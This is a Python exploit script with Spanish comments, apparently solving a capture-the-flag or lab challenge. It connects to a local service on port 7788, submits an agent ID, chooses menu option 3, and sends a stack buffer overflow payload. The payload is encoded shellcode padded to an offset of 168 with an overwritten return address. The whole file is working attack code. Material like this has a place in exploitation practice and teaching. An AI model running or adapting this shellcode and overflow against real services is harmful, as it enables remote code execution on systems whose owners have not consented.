#!/usr/bin/python3

from struct import pack
import socket

shellcode = (b"\x29\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
b"\x0e\x72\x6a\x4d\x7a\x83\xee\xfc\xe2\xf4\x43\xb1\xba\x99"
b"\x21\x29\x1e\x10\x70\xe3\xac\xca\x14\xa7\xcd\xe9\x2b\xda"
b"\x72\xb7\xf2\x23\x34\x83\x1a\xaa\xe5\x7b\x1a\x02\x4f\x7a"
b"\x73\xd1\xc4\x9b\xc2\x0c\x1d\x2b\x21\xd9\x4e\xf3\x93\xa7"
b"\xcd\x28\x1a\x04\x62\x09\x1a\x02\x62\x55\x10\x03\xc4\x99"
b"\x20\x39\xc4\x9b\xc2\x61\x80\xfa")

offset = 168
payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x08048563) + b"\n"
																#El \n es porque hay que darle al ENTER

# Para ejecutar el binario, hay que conectarse a través del puerto 7788
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))

#data = s.recv(1024)
#print(data)
s.recv(1024)

# Se introduce el Agent ID. El \n es porque hay que darle al ENTER
s.send(b"48093572\n")

#data = s.recv(1024)
#print(data)
s.recv(1024)

# Se elige la tercera opción del menú
s.send(b"3\n")
s.recv(1024)
s.send(payload)
